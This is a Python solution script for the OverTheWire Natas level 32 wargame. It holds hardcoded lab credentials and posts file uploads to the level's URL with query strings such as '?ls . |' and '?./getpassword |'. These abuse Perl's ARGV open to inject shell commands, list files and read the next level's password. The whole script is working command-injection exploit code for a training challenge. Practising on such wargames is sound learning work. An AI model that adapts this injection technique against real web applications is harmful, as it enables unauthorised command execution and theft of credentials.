import requests
from requests.auth import HTTPBasicAuth
import json
import datetime
import time
import string
from urllib import parse
import base64
import urllib
import re


    
natasURL = 'http://natas32.natas.labs.overthewire.org/'
natas_usr   = 'natas32'
natas_pword = 'no1vohsheCaiv3ieH4em1ahchisainge'

r = requests.Session()

injection_url = natasURL + '?ls . |'
files = {'file': open('real.csv','rb')}

resp = requests.post(injection_url, files=files, data={'file': 'ARGV', 'submit':'Upload'}, auth=(natas_usr, natas_pword))

print(resp.text)

injection_url = natasURL + '?./getpassword |'
files = {'file': open('real.csv','rb')}

resp = requests.post(injection_url, files=files, data={'file': 'ARGV', 'submit':'Upload'}, auth=(natas_usr, natas_pword))

print(resp.text)

